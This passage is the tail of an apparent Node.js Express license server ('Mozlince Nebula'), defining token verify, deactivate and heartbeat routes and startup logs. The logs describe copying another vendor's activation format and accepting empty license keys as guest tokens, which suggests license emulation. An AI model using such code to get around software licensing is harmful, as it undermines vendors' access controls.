app.post('/v1/deactivate',deactivateHandler); app.post('/api/v1/deactivate',deactivateHandler); app.post('/api/v1/license/deactivate',deactivateHandler);

function verifyHandler(req,res){ const {token}=req.body||{}; if(!token)return res.status(400).json({ok:false,error:'missing_token'}); try{const d=jwt.verify(token,PUBLIC_KEY||PRIVATE_KEY,{algorithms:['ES256'],clockTolerance:30});return res.json({ok:true,valido:true,dados:d});} catch(e){return res.status(401).json({ok:false,valido:false,erro:e.message});} }
app.post('/v1/verify',verifyHandler); app.post('/api/v1/verify',verifyHandler); app.post('/api/v1/license/verify',verifyHandler);
app.post('/verificar-licenca',(req,res)=>{ const {token}=req.body; if(!token)return res.status(400).json({erro:'Token obrigatorio'}); try{const d=jwt.verify(token,PUBLIC_KEY||PRIVATE_KEY,{algorithms:['ES256'],clockTolerance:30});res.json({valido:true,dados:d});} catch(e){res.status(401).json({valido:false,erro:e.message});} });

function heartbeatHandler(req,res){ const auth=validateBearer(req); if(!auth.ok)return res.status(401).json({ok:false,error:'missing_bearer'}); res.json({ok:true,alive:true,serverTime:Date.now(),expiresAt:auth.decoded.expiresAt,expiresIn:auth.decoded.expiresAt?(Math.max(0,Math.floor((auth.decoded.expiresAt-Date.now())/1000))):-1,lifetime:auth.decoded.lifetime===true}); }
app.post('/v1/heartbeat',heartbeatHandler); app.get('/v1/heartbeat',heartbeatHandler);
app.post('/api/v1/heartbeat',heartbeatHandler); app.get('/api/v1/heartbeat',heartbeatHandler);

app.use((req,res)=>{res.status(404).json({ok:false,error:'not_found',path:req.path});});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
  banner();
  log('SYS', `Mozlince Nebula v8.3.1 Aurora++ na porta ${PORT}`);
  log('SYS', `Chave: ${ORIGEM}`);
  log('SYS', `Redis: ${UPSTASH_URL ? 'OK' : 'FALTA'}`);
  log('SYS', `Telegram: ${TELEGRAM_TOKEN ? 'OK' : 'FALTA'}`);
  log('SYS', `Planos: ${Object.keys(PACOTES).length} (USD)`);
  log('RULES', `✔ Payment Rules carregadas: ${PAYMENT_RULES.length} regras (v${RULES_VERSION})`);
  log('RULES', `✔ /v1/activate formato Asheo (entitlement + secret + gwPass)`);
  log('RULES', `✔ /v1/feature/activate formato Asheo (nonce + feature + expiresAt)`);
  log('RULES', `✔ /v1/rules modo enc (pack.encPack)`);
  log('RULES', `✔ /v1/campaign formato Asheo ({ campaign: null })`);
  log('OK', `✔ Aceita licenseKey vazia (guest token)`);
  log('OK', `✔ Expiração REAL`);
  log('OK', `✔ Tradução TOTAL PT/EN`);
  log('OK', `✔ Suporte interativo + /resp`);
});

process.on('uncaughtException', e => log('ERRO', 'Uncaught: ' + e.message));
process.on('unhandledRejection', e => log('ERRO', 'Rejection: ' + e));
